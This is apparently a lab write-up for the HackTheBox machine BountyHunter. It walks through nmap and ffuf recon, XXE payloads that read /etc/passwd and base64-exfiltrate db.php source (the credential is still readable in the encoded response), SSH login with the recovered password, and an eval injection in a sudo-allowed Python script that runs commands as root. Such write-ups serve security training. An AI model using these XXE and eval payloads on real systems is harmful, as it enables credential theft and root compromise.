---
layout: post
name: bounty-hunter
title:  "HackTheBox: BountyHunter"
date:   2021-10-26 10:19:36 +1000
categories: red-team
tags: burp-suite cyber-chef linux nmap python xml xxe
excerpt_separator: <!--more-->
---

**BountyHunter** is a Linux-based machine authored by *ejedev*, with an average rating of 4.5 stars.

<!--more-->

<p align="center"><img src="/assets/images/bounty-hunter/main.png" /></p>

### // Recon
```
nmap -A -p- 10.10.11.100
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-26 13:33 AEST
Nmap scan report for 10.10.11.100
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
```

Nmap confirms the machine is Linux-based (running Ubuntu) and reveals two open services:
* ssh on port 22
* http on port 80

Browsing to the IP presents us with a website for 'The B Team', a company offering web security services:

<p align="center"><img src="/assets/images/bounty-hunter/1.png" /></p>

The site appears to be under development, and scanning the HTML source for comments doesn't reveal anything interesting. Clicking on the *Portal* link routes us to `http://10.10.11.100/portal.php`, revealing that the site is built using PHP. We can follow the link on that page to a further page, *Bounty Report System - Beta*, which displays a basic form:

<p align="center"><img src="/assets/images/bounty-hunter/2.png" /></p>

The form can be submitted, but apparently has no input validation - entering empty values for all fields is fine. So far this seems to be the most interesting area of the site, so the next step is to take a closer look at the traffic through [Burp Suite](https://portswigger.net/burp). After entering some pseudo-sensible values into the form, Burp reveals that data is transmitted to the server as a single encoded variable:

<p align="center"><img src="/assets/images/bounty-hunter/3.png" /></p>

The value of *data* looks url-encoded. Running it through [CyberChef](https://gchq.github.io/CyberChef/) returns a value that in turn looks base64-encoded, which can itself be decoded to regular XML:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
<title>Test</title>
<cwe>1234</cwe>
<cvss>9.5</cvss>
<reward>500</reward>
</bugreport>
```

### // Initial Foothold
As outlined in the PortSwigger [Web Security Academy](https://portswigger.net/web-security/xxe), web applications that allow for the exchange of data in XML format can be vulnerable to XXE (XML eXternal Entity) attacks. One of the most commonly exploited XXE vulnerabilities is to leverage an *external entity* definition to steal sensitive files from the system, such as `/etc/passwd`. Using Burp we can modify the *data* payload prior to its encoding to test this out:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>Test</title>
<cwe>1234</cwe>
<cvss>9.5</cvss>
<reward>&xxe;</reward>
</bugreport>
```

The response to this request includes the contents of `/etc/passwd`, indicating the server is indeed vulnerable to XXE:

<p align="center"><img src="/assets/images/bounty-hunter/4.png" /></p>

We know from the initial nmap scan that ssh is running on the machine, so this user list may provide an opportunity to enter the system that way. Any user with an invalid shell (e.g `/usr/sbin/nologin`, `/bin/false`) can immediately be discarded, as these accounts by definition cannot login. The *development* user therefore looks to be of most interest, but we still don't have a password or ssh key at this stage:

```
development:x:1000:1000:Development:/home/development:/bin/bash
```

Using the XXE technique to probe for credentials, such as a private ssh-key belonging to the development user (e.g `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/development/.ssh/id_rsa"> ]>`) is unsuccessful, meaning the file doesn't exist or is inaccessible due to file permissions. At this point it seems we've exhausted this avenue, and need to go back to the website for further exploration.

Earlier we learned the site is running PHP, so now seems like a good opportunity to fuzz the site with an appropriate wordlist. In this case we're using [ffuf](https://github.com/ffuf/ffuf) and a php-focused wordlist from the [SecLists](https://github.com/danielmiessler/SecLists) repo:

```
ffuf -u http://10.10.11.100/FUZZ -w /Sites/github/danielmiessler/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -mc 200,403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.100/FUZZ
 :: Wordlist         : FUZZ: /Sites/github/danielmiessler/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,403
________________________________________________

index.php               [Status: 200, Size: 25168, Words: 10028, Lines: 389]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]
:: Progress: [5163/5163] :: Job [1/1] :: 1812 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

We've already discovered `index.php` and `portal.php` through browsing, but `db.php` hasn't been seen so far. Files such as this can often be used to store credentials or other sensitive information, especially while a site is still under development. The server prevents us from accessing the file's source code directly, by running (interpreting) the php code whenever we try to access the file, but our XXE file-retrieval trick from earlier may be able to help:

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>Test</title>
<cwe>1234</cwe>
<cvss>9.5</cvss>
<reward>&xxe;</reward>
</bugreport>
```

We've swapped from the `file://` wrapper to `php://`, which allows us to base64-encode a file prior to retrieving it. Php code makes use of characters that would break the XML response format, but encoding allows us to smuggle out the source-code in an acceptable form. The response is as follows:

```
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>Test</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>1234</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>9.5</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
  </tr>
</table>
```

Running the encoded value through CyberChef again returns the original source-code:
```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m*******************";
$testuser = "test";
```

We now have a new login `admin`, as well as a password. Using these together as ssh credentials doesn't work, but using the newly-found password with our previously identified user `development` does:
```
ssh development@10.10.11.100                                                                                                                                    255 ✘
development@10.10.11.100's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

development@bountyhunter:~$
```

Checking the contents of the home directory, we quickly find the usual `user.txt` file containing the key to claim User-Own:
```
development@bountyhunter:~$ ls
contract.txt  user.txt
```

## // Privilege Escalation
The `contract.php` file in the same directory seems like a good place to start our quest for System-Own:
```
development@bountyhunter:~$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

"I set up the permissions for you to test this" sounds interesting. Checking for commands our `development` user is allowed to execute at elevated privileges reveals more:
```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The `/opt/syktrain_inc` directory contains a python script and an `invalid_tickets` sub-directory. Custom source-code is a frequent source of security vulnerabilities, so let's look closer at `ticketValidator.py`:
```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The script is meant to represent a basic ticket validation system. It begins by loading the ticket specified from file (`load_file(fileName)`) and then evaluating it against some pre-defined logic (`evalute(ticket)`). Even though the process is trivial, it already displays an indication of the kind of vulnerabilities that plague many web apps - the assumption-laden processing of untrusted input. Sure enough, looking closer at the source code shows our potential way in:
```
validationNumber = eval(x.replace("**", ""))
```

Python's `eval` function (and its equivalent is many other languages) is designed to execute input as code. If the validation of that input is not iron-clad, the function represents a serious security risk, which is why many development teams forbid its use. In this instance we can craft our own ticket to contain a malicious payload, and as long as it conforms to the validation rules, we can run it with elevated privileges.

With our fake ticket written to file at `/tmp/ticket.md`:
```
# Skytrain Inc
## Ticket to abc123
__Ticket Code:__
**144+3==147 and print(__import__('os').system('ls -l /root'))
```
we can run the script and have our payload executed, in this case listing the contents of `/root`:
```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/ticket.md
Destination: abc123
total 8
-r-------- 1 root root   33 Oct 26 10:55 root.txt
drwxr-xr-x 3 root root 4096 Apr  5  2021 snap
```

From here, we only need to make a minor adjustment to our payload to output the contents of the `root.txt` file, giving us the System-Own key:
```
# Skytrain Inc
## Ticket to abc123
__Ticket Code:__
**144+3==147 and print(__import__('os').system('cat /root/root.txt'))

development@bountyhunter:/opt$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/ticket.md
Destination: abc123
6*******************************
0
```



